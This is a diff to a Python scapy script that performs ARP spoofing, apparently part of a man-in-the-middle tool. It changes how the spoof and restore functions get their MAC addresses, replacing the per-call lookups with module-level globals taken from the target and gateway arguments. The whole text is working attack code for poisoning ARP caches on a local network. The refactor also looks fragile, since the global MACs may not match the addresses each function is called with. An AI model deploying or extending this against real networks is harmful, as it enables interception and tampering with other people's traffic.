@@ -28,14 +28,14 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+    # target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
     scapy.send(packet, verbose=False)
 
 
 def restore(source_ip, destination_ip):
-    source_mac = get_mac(source_ip)
-    destination_mac = get_mac(destination_ip)
+    # source_mac = get_mac(source_ip)
+    # destination_mac = get_mac(destination_ip)
     packet = scapy.ARP(op=2, psrc=source_ip, pdst=destination_ip, hwdst=destination_mac, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
@@ -43,7 +43,10 @@ def restore(source_ip, destination_ip):
 arguments = get_arguments()
 target = arguments.target
 gateway = arguments.gateway
-
+# Get mac
+target_mac = get_mac(target)
+source_mac = get_mac(gateway)
+destination_mac = get_mac(target)
 
 packets_sent_counter = 0
 try:
